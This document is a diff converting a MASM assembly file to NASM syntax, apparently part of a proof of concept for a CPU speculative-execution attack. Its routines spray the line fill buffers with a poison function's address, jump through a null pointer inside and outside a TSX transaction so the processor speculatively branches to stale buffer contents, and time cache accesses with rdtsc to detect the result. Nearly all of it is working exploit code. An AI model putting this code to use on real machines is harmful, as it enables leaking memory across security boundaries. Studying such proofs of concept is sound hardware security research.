@@ -1,10 +1,11 @@
-    .code
+SECTION .text
 
 ;
 ; SprayFillBuffers
 ; RCX = Address of the buffer containing the address of the target, poison, function.
 ;
-SprayFillBuffers PROC
+GLOBAL SprayFillBuffers
+SprayFillBuffers:
     mfence
     clflush         [rcx + 0 * 64]
     clflush         [rcx + 1 * 64]
@@ -41,7 +42,6 @@ SprayFillBuffers PROC
     mov             rax, [rcx + 15 * 64]
     mfence
     ret
-SprayFillBuffers ENDP
 
 
 ;
@@ -50,47 +50,55 @@ SprayFillBuffers ENDP
 ; as a destination for the indirect branch.
 ;
     mfence                                  ; Just to make sure someone doesn't get here speculatively...
-PoisonFunction PROC
+GLOBAL PoisonFunction
+PoisonFunction:
     mov             rcx, 0BDBD0000h         ; Address which is used to check whether this executed or not. 
     mov             rax, [rcx]              ; Access it, so it gets cached - this way we'll now this got executed.
     mfence
     ret
-PoisonFunction ENDP
+
 
 
 ;
 ; VictimFunctionTsx - jump to [0] inside a transaction. Many times the CPU would read stale data from the LFB
 ; and it would branch to those addresses.
 ;
-VictimFunctionTsx PROC
+GLOBAL VictimFunctionTsx
+VictimFunctionTsx:
     mfence
     xbegin      __abort_tsx
     mov         rax, 0000000000000000h      ; [1]
-    jmp         qword ptr [rax]             ; [2]
+    ;jmp         qword ptr [rax]             ; [2]
+    jmp         qword [rax]             ; [2]
     xend
 __abort_tsx:
     mfence
     ret
-VictimFunctionTsx ENDP
+;VictimFunctionTsx ENDP
 
 
 ;
 ; VictimFunctionFault - jump to [0] outside a transaction. Many times the CPU would read stale data from the LFB
 ; and it would branch to those addresses.
 ;
-VictimFunctionFault PROC
+;VictimFunctionFault PROC
+GLOBAL VictimFunctionFault
+VictimFunctionFault:
     mfence
     mov         rax, 0000000000000000h      ; Load 0 in RAX.
-    jmp         qword ptr [rax]             ; Normally this will branch to whatever is in the LFBs.
+    ;jmp         qword ptr [rax]             ; Normally this will branch to whatever is in the LFBs.
+    jmp         qword [rax]             ; Normally this will branch to whatever is in the LFBs.
     mfence
     ret
-VictimFunctionFault ENDP
+;VictimFunctionFault ENDP
 
 
 ;
 ; MeasureAccessTime
 ;
-MeasureAccessTime PROC
+;MeasureAccessTime PROC
+GLOBAL MeasureAccessTime
+MeasureAccessTime:
     mfence
 
     rdtsc
@@ -112,6 +120,6 @@ MeasureAccessTime PROC
     mfence
 
     ret
-MeasureAccessTime ENDP
+;MeasureAccessTime ENDP
 
-    END
+;    END
